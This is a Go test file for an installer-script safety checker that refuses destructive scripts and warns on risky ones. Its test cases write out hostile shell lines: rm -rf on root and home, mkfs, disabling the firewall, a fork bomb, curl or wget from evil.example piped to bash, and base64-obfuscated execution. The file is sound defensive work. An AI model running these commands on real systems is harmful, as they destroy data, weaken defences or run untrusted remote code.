package install

import (
	"strings"
	"testing"
)

func TestCheckScriptRefused(t *testing.T) {
	cases := []struct {
		name   string
		script []byte
	}{
		{"empty", []byte("   \n")},
		{"binary", []byte{0xff, 0xfe, 0x00, 0x01}},
		{"control_char", []byte("#!/bin/sh\necho \x07hi\n")},
		{"rm_root", []byte("#!/bin/sh\nsudo rm -rf /\n")},
		{"rm_home", []byte("#!/bin/sh\nrm -rf \"$HOME\"\n")},
		{"rm_etc_glob", []byte("#!/bin/sh\nrm -rf /etc/*\n")},
		{"mkfs", []byte("#!/bin/sh\nmkfs.ext4 /dev/sda1\n")},
		{"ufw_disable", []byte("#!/bin/sh\nufw disable\n")},
		{"fork_bomb", []byte("#!/bin/sh\n:(){ :|:& };:\n")},
	}
	for _, tc := range cases {
		fs := CheckScript(tc.script, "/home/me")
		if !Refused(fs) {
			t.Errorf("%s: expected refused, got %+v", tc.name, fs)
		}
	}
}

func TestCheckScriptHighRiskWarnings(t *testing.T) {
	cases := []struct {
		name     string
		script   []byte
		wantRule string
		wantLine int
	}{
		{"pipe_to_shell", []byte("#!/bin/sh\n\ncurl -fsSL https://evil.example/a | bash\n"), RulePipeToShell, 3},
		{"pipe_via_tee_to_shell", []byte("#!/bin/sh\ncurl -fsSL https://evil.example/a | tee /tmp/x | bash\n"), RulePipeToShell, 2},
		{"pipe_to_sudo_shell", []byte("#!/bin/sh\nwget -qO- https://evil.example/a | sudo -E bash\n"), RulePipeToShell, 2},
		{"proc_sub_curl", []byte("#!/bin/bash\nbash <(curl -fsSL https://evil.example/a)\n"), RulePipeToShell, 2},
		{"base64_decode", []byte("#!/bin/sh\necho ZWNobyBoaQo= | base64 -d | sh\n"), RuleHidden, 2},
		{"base64_extra_flags", []byte("#!/bin/sh\necho ZWNobyBoaQo= | base64 -i -d\n"), RuleHidden, 2},
		{"multibyte_hex_decode", []byte("#!/bin/sh\nprintf '\\x63\\x75\\x72\\x6c'\n"), RuleHidden, 2},
		{"eval_subshell", []byte("#!/bin/sh\neval \"$(curl -fsSL https://evil.example/a)\"\n"), RuleHidden, 2},
		{"inline_bash_c_curl", []byte("#!/bin/sh\nbash -c \"curl -fsSL https://evil.example/a | sh\"\n"), RuleHidden, 2},
	}
	for _, tc := range cases {
		fs := CheckScript(tc.script, "/home/me")
		if Refused(fs) {
			t.Errorf("%s: expected warning (Refuse=false), got refused: %+v", tc.name, fs)
			continue
		}
		if !NeedsCustomConfirm(fs) {
			t.Errorf("%s: expected NeedsCustomConfirm=true, got %+v", tc.name, fs)
		}
		found := false
		for _, f := range fs {
			if f.Rule == tc.wantRule {
				found = true
				if f.Line != tc.wantLine || f.Snippet == "" {
					t.Errorf("%s: expected line=%d and non-empty snippet, got %+v", tc.name, tc.wantLine, f)
				}
			}
		}
		if !found {
			t.Errorf("%s: missing expected rule %s in %+v", tc.name, tc.wantRule, fs)
		}
	}
}

func TestCheckScriptSingleByteHexAndANSIAllowed(t *testing.T) {
	// Hermes install.sh line 332 `$'\x7f'ELF*` and ANSI color escapes `\x1b[32m`
	// must not trigger false-positive RuleHidden decoding findings.
	hermes := []byte(`#!/usr/bin/env bash
case "$hdr" in
  $'\x7f'ELF*)
    printf "\x1b[32mDetected ELF binary\x1b[0m\n"
    ;;
esac
`)
	if fs := CheckScript(hermes, "/home/me"); len(fs) != 0 {
		t.Fatalf("Hermes ELF header and ANSI color escape falsely flagged: %+v", fs)
	}
}

func TestCheckScriptAllowedAndFindings(t *testing.T) {
	// Clean script without URLs or risky operations -> no findings.
	clean := []byte("#!/bin/sh\n# Usage: curl -fsSL https://example.com/i.sh | bash\nDIR=\"$(mktemp -d)\"\necho ok > \"$DIR/out\"\n")
	if fs := CheckScript(clean, "/home/me"); len(fs) != 0 {
		t.Fatalf("clean script with usage comment had findings: %+v", fs)
	}

	// Realistic installer script using $(uname -m), curl to file, and temp rm -rf -> allowed with findings (not refused).
	realistic := []byte(`#!/usr/bin/env bash
set -euo pipefail
# Usage: curl -fsSL https://openclaw.ai/install-cli.sh | bash
ARCH="$(uname -m)"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
curl -fsSL "https://nodejs.org/dist/v24.22.1/node.tar.xz" -o "$TMP/node.tar.xz"
echo "$ARCH"
`)
	fs := CheckScript(realistic, "/home/me")
	if Refused(fs) {
		t.Fatalf("realistic installer falsely refused: %+v", fs)
	}
	if !NeedsCustomConfirm(fs) {
		t.Fatalf("expected custom confirm for download/rm findings, got %+v", fs)
	}
	var rules []string
	for _, f := range fs {
		rules = append(rules, f.Rule)
	}
	joined := strings.Join(rules, ",")
	if !strings.Contains(joined, RuleDownload) {
		t.Fatalf("expected download finding, got %+v", fs)
	}

	// Privilege alone triggers NeedsCustomConfirm.
	priv := []byte("#!/bin/sh\nsudo mkdir -p /opt/demo\n")
	fs = CheckScript(priv, "/home/me")
	if Refused(fs) || !NeedsCustomConfirm(fs) || len(fs) != 1 || fs[0].Rule != RulePrivilege {
		t.Fatalf("privilege script got %+v", fs)
	}
}
